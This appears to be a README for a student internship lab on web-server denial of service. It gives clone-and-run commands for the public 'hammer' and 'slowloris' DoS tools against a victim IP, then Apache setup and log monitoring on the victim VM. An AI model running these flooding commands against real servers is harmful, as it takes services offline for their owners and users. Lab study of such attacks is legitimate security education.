# IIT-JAMMU
IIT JAMMU PROJECT INTERNSHIP FILES
⚙ Requirements
Kali Linux (Attacker)

Kali Linux / Windows 10 (Victim)

Python 3.10+

Apache2 / XAMPP

Wireshark

VirtualBox

🚀 Quick Start
1️⃣ Clone Attack Tool
bash
Copy
Edit
git clone https://github.com/cyweb/hammer.git
cd hammer
python3 hammer.py -s <victim_ip> -p 80 -t 135
2️⃣ Slowloris Attack
bash
Copy
Edit
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py <victim_ip> -s 500
3️⃣ Apache Server (Victim)
Linux:

bash
Copy
Edit
sudo apt install apache2
sudo service apache2 start
Windows (XAMPP): Start Apache from Control Panel.

📊 Monitor Traffic
Linux Victim:

bash:
Copy
Edit
sudo tail -f /var/log/apache2/access.log
Windows Victim:

powershell
Copy
Edit
Get-Content "C:\xampp\apache\logs\access.log" -Wait
